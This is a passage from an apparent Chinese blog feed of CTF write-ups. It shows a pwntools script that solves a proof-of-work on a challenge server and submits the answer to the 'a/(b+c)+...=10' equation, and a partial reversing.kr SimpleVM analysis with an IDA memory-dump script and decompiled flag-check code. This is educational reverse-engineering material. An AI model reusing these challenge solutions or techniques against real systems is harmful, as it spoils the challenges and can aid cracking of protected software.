当从lable0跳转过来，t8 = t15，当从label5跳转过来。</p><p>得出功能func2—-两个数字相加.<br>func4—-两个数字相乘<br>func1—-两个数字是否相等</p><p>好了，容易写出脚本爆破如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> t24 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">for</span> t26 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">            <span class="keyword">for</span> t28 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">                t50 = t24+t26</span><br><span class="line">                t51 = t24+t28</span><br><span class="line">                t52 = t26+t28</span><br><span class="line"></span><br><span class="line">                t53 = t50*t51</span><br><span class="line">                t54 = t53*t24</span><br><span class="line">                t55 = t50*t52</span><br><span class="line">                t56 = t55*t26</span><br><span class="line">                t57 = t51*t52</span><br><span class="line">                t58 = t57*t28 </span><br><span class="line"></span><br><span class="line">                t59 = t56+t58</span><br><span class="line">                t60 = t54+t59</span><br><span class="line"></span><br><span class="line">                t64 = t51*t52</span><br><span class="line">                t65 = t50*t64</span><br><span class="line">                t66 = <span class="number">10</span>*t65</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(t66 == t60):</span><br><span class="line">                    <span class="keyword">print</span> t24,t26,t28</span><br><span class="line">                    <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cal()</span><br></pre></td></tr></table></figure></p><p>但是，错了，我发现根本爆不出来这个东西，最后，我精简了这个过程，得到如下方程:<br>a/b+c + b/a+c + c/a+b = 10<br>一看很简单，但是。。。<br>求助大佬，大佬给我一个帖子：[史上最贱的数学题= =]<a href="https://www.zhihu.com/question/267427508/answer/324979078" target="_blank" rel="noopener">https://www.zhihu.com/question/267427508/answer/324979078</a><br>跟着大佬利用mathmatical9，规规矩矩的抄了代码。</p><p>最后得出一下脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str1 = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sha</span><span class="params">(a,b)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">                        <span class="keyword">for</span> m <span class="keyword">in</span> str1:</span><br><span class="line">                                <span class="keyword">for</span> n <span class="keyword">in</span> str1:</span><br><span class="line">                                        name = (i)+(j)+(m)+(n)+a</span><br><span class="line">                                        <span class="keyword">if</span> hashlib.sha256(name).hexdigest() == b:</span><br><span class="line">                                                <span class="keyword">print</span> (i)+(j)+(m)+(n)</span><br><span class="line">                                                <span class="keyword">return</span> (i)+(j)+(m)+(n)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:         </span><br><span class="line">        p = remote(<span class="string">'202.120.7.206'</span>, <span class="number">13337</span>)</span><br><span class="line">        str2 = p.recvline()</span><br><span class="line">        <span class="keyword">print</span> str2</span><br><span class="line">        a = str2[<span class="number">12</span>:<span class="number">28</span>]</span><br><span class="line">        b = str2[<span class="number">33</span>:<span class="number">97</span>]</span><br><span class="line">        <span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">        p.send(get_sha(a,b))</span><br><span class="line">        <span class="keyword">print</span> p.recv()</span><br><span class="line">        p.sendline(<span class="string">'269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977'</span>)</span><br><span class="line">        p.sendline(<span class="string">'4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209'</span>)</span><br><span class="line">        p.sendline(<span class="string">'221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347'</span>)</span><br><span class="line">        <span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure></p><p>[题目链接]<a href="https://pan.baidu.com/s/1aXVjFQRzgPDA6a8RQJRTTg" target="_blank" rel="noopener">https://pan.baidu.com/s/1aXVjFQRzgPDA6a8RQJRTTg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;题目给的是一个log文件，打开查看，发现是go语言编写的，所以才叫g0g0g0…&lt;/p&gt;
&lt;h3 id=&quot;思路流程&quot;&gt;&lt;a href=&quot;#思
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>reversing.kr-writeup</title>
    <link href="https://foyjog.github.io/2018/03/08/reversing-kr-writeup/"/>
    <id>https://foyjog.github.io/2018/03/08/reversing-kr-writeup/</id>
    <published>2018-03-08T13:43:34.000Z</published>
    <updated>2018-07-03T08:19:16.763Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>逆向还是很好玩的，这个reversing.kr的韩国网站，题目还是很有质量的，过年接近一个月，每天做几道题目还是比较舒服的，做着做着也就还剩几道题目没做了，这里先把做过的慢慢记录下来，以后还可以经常返回来看一下，不至于做过就忘了。</p><h3 id="SimpleVM"><a href="#SimpleVM" class="headerlink" title="SimpleVM"></a>SimpleVM</h3><p>装载自freebuf<br>概述<br>Reversing.kr是一个韩国的逆向题练习网站，题目的质量还是比较好的，比较费时间去破解，这里给出我在刷到SimpleVM这道题目的时候的一些心得和体会。</p><p>SimpleVM</p><h4 id="0"><a href="#0" class="headerlink" title="0"></a>0</h4><p>拿到文件之后拖入ida分析，发现报错，illegal program entry point(C023DC)。我们继续打开文件，发现程序在00C023C7的时候就中断了，所以会报这个不合法的入口点，我们通过readelf命令可以清楚的查看到program header的信息(FileSize 为13C7)：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  LOAD           <span class="number">0x000000</span> <span class="number">0x00c01000</span> <span class="number">0x00c01000</span> <span class="number">0x013c7</span> <span class="number">0x013c7</span> RWE <span class="number">0x1000</span></span><br><span class="line">  LOAD           <span class="number">0x00019c</span> <span class="number">0x0804b19c</span> <span class="number">0x0804b19c</span> <span class="number">0x00000</span> <span class="number">0x00000</span> RW  <span class="number">0x1000</span></span><br></pre></td></tr></table></figure></p><p>但是有一点是这样的，Linux中文件/内存映射总是页面大小的倍数，在x86上通常是4k。此处的映射长度0x13c7将四舍五入为页面大小的倍数，这意味着0×2000字节将被映射。所以其实我们通过010editor去查看该文件是可以看到(c023dc-c01000) = 13dc是有数据的。我们去更改一下FileSize和MemSize,之后拖入ida发现是正确的。我们在C023DC出查看代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                          ; DATA XREF: LOAD:<span class="number">00</span>C01018↑o</span><br><span class="line">LOAD:<span class="number">00</span>C023DC                 mov     dword_C01BF0, <span class="number">252E8</span>h</span><br><span class="line">LOAD:<span class="number">00</span>C023DC ; ---------------------------------------------------------------------------</span><br><span class="line">LOAD:<span class="number">00</span>C023E6                 db <span class="number">0E9</span>h</span><br><span class="line">LOAD:<span class="number">00</span>C023E7                 db    <span class="number">5</span></span><br><span class="line">LOAD:<span class="number">00</span>C023E8                 db <span class="number">0F</span>8h</span><br><span class="line">LOAD:<span class="number">00</span>C023E9                 db <span class="number">0F</span>Fh</span><br><span class="line">LOAD:<span class="number">00</span>C023E9 LOAD            ends</span><br></pre></td></tr></table></figure></p><p>后面的db没有被翻译出来，但是我们通过E9命令这是一个跳转的jmp命令，从而进入正常的程序流程。</p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>我们利用ida的linux_server进行虚拟机的远程调试，直接启动，ctrl+s查看段信息如下：Reversing.kr题目之SimpleVM详解</p><p>看LOAD段完全没有任何的突破口，但是观察到debug001和debug002这两个段。我们进去看一下，发现前面几个字节0x7f,0×45,0x4c,0×46，一个明显的elf文件我们得把他dump下来，基本的ida script模板如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> fp, begin, end, dexbyte;</span><br><span class="line">  fp = fopen(<span class="string">"D:\\dump.txt"</span>, <span class="string">"wb"</span>);</span><br><span class="line">  begin = <span class="number">0x8048000</span>;</span><br><span class="line">  end = <span class="number">0x804c000</span>;</span><br><span class="line">  <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )</span><br><span class="line">      fputc((dexbyte), fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得到一个dump文件。</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>我们将dump文件拖入ida分析，shift+f12查看字符串，好的“input”字符串没有被加密，直接出来，我们定位到该函数sub_8048556().我们发现所有的函数都被重新加密了，我们看input的这个函数，</p><p> sub_8048460(1, (int)”Input : “, 8);<br>明显可以得出它是类似与printf()的一个函数，我这里采用了一个动态调试的方法去跟踪该函数。首先记录下该函数的位置为8048460，接着利用ida运行起来这个文件，定位到8048460这个点。快捷键c一下，code出来为jmp off_804B018，跟进可知off_804B018的值为F7E1D3C0，显然这是一个so文件的函数，我们ctrl+s发现这个函数存在libc_2.23.so中。去查看Modules窗口查看libc_2.23.so，好像并不能查看name，无妨，我们从虚拟机中拷贝一份libc_2.23.so拖入ida分析，通过F7E1D3C0与libc_2.23.so的首地址的偏移量去查找，发现这个函数就是libc中的write函数。利用这个方法，我们可以得出大部分的系统调用函数出来，大致如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sub_8048460 -- write()</span><br><span class="line">sub_8048470 -- pipe()</span><br><span class="line">sub_8048480 -- fork()</span><br><span class="line">sub_8048400 -- read()</span><br></pre></td></tr></table></figure></p><p>同时通过动态调试将类似与下方的代码分析称相应的字符串输出即可：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">      v8 = byte_804B074[i - <span class="number">1</span>] ^ i;</span><br><span class="line">      write(<span class="number">1</span>, (<span class="keyword">int</span>)&amp;v8, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>整个函数翻译如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048556</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  v16 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( getuid() )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">14</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = access_denyed[i - <span class="number">1</span>] ^ i;</span><br><span class="line">      write(<span class="number">1</span>, (<span class="keyword">int</span>)&amp;v8, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Input : "</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( pipe((<span class="keyword">int</span>)&amp;v3) != <span class="number">-1</span> &amp;&amp; pipe((<span class="keyword">int</span>)&amp;v5) != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = fork();</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">          v8 = error[i - <span class="number">1</span>] ^ i;</span><br><span class="line">          write(<span class="number">1</span>, (<span class="keyword">int</span>)&amp;v8, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        v14 = <span class="number">0</span>;</span><br><span class="line">        v15 = <span class="number">0</span>;</span><br><span class="line">        read(v3, (<span class="keyword">int</span>)&amp;v13, <span class="number">9</span>);</span><br><span class="line">        read(v3, (<span class="keyword">int</span>)&amp;dword_804B0A0, <span class="number">200</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">199</span>; ++i )</span><br><span class="line">          *(_BYTE *)(i + <span class="number">134525088</span>) ^= <span class="number">0x20</span>u;</span><br><span class="line">        dword_804B0A0 = v13;</span><br><span class="line">        dword_804B0A4 = v14;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">199</span>; ++i )</span><br><span class="line">          *(_BYTE *)(i + <span class="number">134525088</span>) ^= <span class="number">0x10</span>u;</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048C6D() == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( dword_804B190 )</span><br><span class="line">          &#123;</span><br><span class="line">            v9 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">            &#123;</span><br><span class="line">              v8 = Correct[i - <span class="number">1</span>] ^ i;</span><br><span class="line">              write(<span class="number">1</span>, (<span class="keyword">int</span>)&amp;v8, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v9 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">            &#123;</span><br><span class="line">              v8 = Wrong[i - <span class="number">1</span>] ^ i;</span><br><span class="line">              write(<span class="number">1</span>, (<span class="keyword">int</span>)&amp;v8, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = Wrong[i - <span class="number">1</span>] ^ i;</span><br><span class="line">            write(<span class="number">1</span>, (<span class="keyword">int</span>)&amp;v8, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        v11 = <span class="number">0</span>;</span><br><span class="line">        v12 = <span class="number">0</span>;</span><br><span class="line">        read(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;v10, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = Wrong[i - <span class="number">1</span>] ^ i;</span><br><span class="line">            write(<span class="number">1</span>, (<span class="keyword">int</span>)&amp;v8, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          write(v4, (<span class="keyword">int</span>)&amp;v10, <span class="number">9</span>);</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">199</span>; ++i )</span><br><span class="line">          &#123;</span><br><span class="line">            v0 = sub_80489AA(*(<span class="keyword">unsigned</span> __int8 *)(i + <span class="number">134525088</span>), <span class="number">3</span>);</span><br><span class="line">            *(_BYTE *)(i + <span class="number">134525088</span>) = v0;</span><br><span class="line">          &#125;</span><br><span class="line">          sub_8048410(dword_804B180);</span><br><span class="line">          write(v4, (<span class="keyword">int</span>)&amp;dword_804B0A0, <span class="number">200</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = error[i - <span class="number">1</span>] ^ i;</span><br><span class="line">        write(<span class="number">1</span>, (<span class="keyword">int</span>)&amp;v8, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  result = v2 ^ v16;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != v16 )</span><br><span class="line">    result = sub_8048420();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>好了，代码差不多出来了，现在先分析代码的功能。首先分析：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( pipe((<span class="keyword">int</span>)&amp;v3) != <span class="number">-1</span> &amp;&amp; pipe((<span class="keyword">int</span>)&amp;v5) != <span class="number">-1</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     v7 = fork();</span><br></pre></td></tr></table></figure></p><p>看出来程序先建立v3和v5两个变量的管道，如果建立成功，fork出一个进程，这两个进程利用v3和v5两个变量进行数据的交互。然后我们分别分析这两个进程要做的事情。如下代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line">v11 = <span class="number">0</span>;</span><br><span class="line">v12 = <span class="number">0</span>;</span><br><span class="line">read(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;v10, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> ( (_BYTE)v12 )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = Wrong[i - <span class="number">1</span>] ^ i;</span><br><span class="line">    write(<span class="number">1</span>, (<span class="keyword">int</span>)&amp;v8, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  write(v4, (<span class="keyword">int</span>)&amp;v10, <span class="number">9</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">199</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = sub_80489AA(*(<span class="keyword">unsigned</span> __int8 *)(i + <span class="number">134525088</span>), <span class="number">3</span>);</span><br><span class="line">    *(_BYTE *)(i + <span class="number">134525088</span>) = v0;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_8048410(dword_804B180);</span><br><span class="line">  write(v4, (<span class="keyword">int</span>)&amp;dword_804B0A0, <span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这段代码作用是read()输入的flag，然后通过管道1的写入v4,向进程2写入flag和写入dword_804B0A0的200个字节。当然有输入就得有接受，我们继续看进程2的接受代码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">read(v3, (<span class="keyword">int</span>)&amp;v13, <span class="number">9</span>);</span><br><span class="line">read(v3, (<span class="keyword">int</span>)&amp;dword_804B0A0, <span class="number">200</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">199</span>; ++i )</span><br><span class="line">     *(_BYTE *)(i + <span class="number">0x804B0A0</span>) ^= <span class="number">0x20</span>u;</span><br><span class="line">dword_804B0A0 = v13;</span><br><span class="line">dword_804B0A4 = v14;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">199</span>; ++i )</span><br><span class="line">     *(_BYTE *)(i + <span class="number">0x804B0A0</span>) ^= <span class="number">0x10</span>u;</span><br><span class="line"><span class="keyword">if</span> ( sub_8048C6D() == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">if</span> ( dword_804B190 )</span><br></pre></td></tr></table></figure></p><p>看出来这个进程是判断flag的正确性，首先接受flag到v13变量中，然后在接受进程1给的200字节到804b0a0中，之后做两次的异或操作，其中 dword_804B0A0 = v13; dword_804B0A4 = v14;两行代码将flag写入到dword_804B0A0的前八个字节，得出flag最多为8个字节，最后利用sub_8048C6D函数进行flag的判断。可以得出关键的代码在sub_8048C6D函数之中，我们跳进去看一下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_8048C6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_8048A48();</span><br><span class="line">    <span class="keyword">switch</span> ( dword_804B190 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_8048B92();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        sub_8048ABB();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        sub_8048B31();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        sub_8048BCE();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        sub_8048C13();</span><br><span class="line">        